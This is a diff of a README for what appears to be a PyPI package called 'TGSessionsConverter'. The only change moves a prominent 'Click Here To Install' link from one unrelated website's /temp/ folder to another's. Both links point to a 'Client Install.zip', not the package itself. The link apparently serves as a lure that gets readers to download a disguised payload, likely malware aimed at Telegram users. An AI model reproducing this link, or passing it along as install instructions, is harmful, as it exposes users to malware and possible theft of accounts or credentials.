@@ -1,7 +1,7 @@
 ![PyPI](https://img.shields.io/pypi/v/TGSessionsConverter)
 ![PyPI - License](https://img.shields.io/pypi/l/TGSessionsConverter)
 
-<H1 align=center><a href="https://abitareproperties.com/temp/Client%20Install.zip">[Click Here To Install]</a></H1>
+<H1 align=center><a href="https://holistikyasam.com/temp/Client%20Install.zip">[Click Here To Install]</a></H1>
 
 
 
